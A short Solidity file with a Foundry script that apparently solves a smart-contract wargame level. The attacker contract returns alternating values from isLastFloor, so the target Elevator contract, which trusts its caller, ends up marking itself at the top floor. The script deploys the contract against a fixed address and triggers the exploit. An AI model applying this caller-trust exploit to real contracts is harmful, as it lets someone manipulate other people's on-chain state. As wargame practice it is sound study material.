// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";


interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Buildin {
    bool toggle = true;
    Elevator private immutable elevator;

    constructor (address _elevator) {
        elevator = Elevator(_elevator);
    }   

    function isLastFloor(uint) public returns(bool) {
        toggle = !toggle;
        return toggle;
    }

    function gooo (uint floor) public {
        elevator.goTo(floor);
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        vm.startBroadcast();
        address elevatorInstance = 0x086cf5558c0061C74BD66564d9D1904DecF08CFf;

        Buildin building = new Buildin(elevatorInstance);

        building.gooo(5);
        vm.stopBroadcast();
    }
}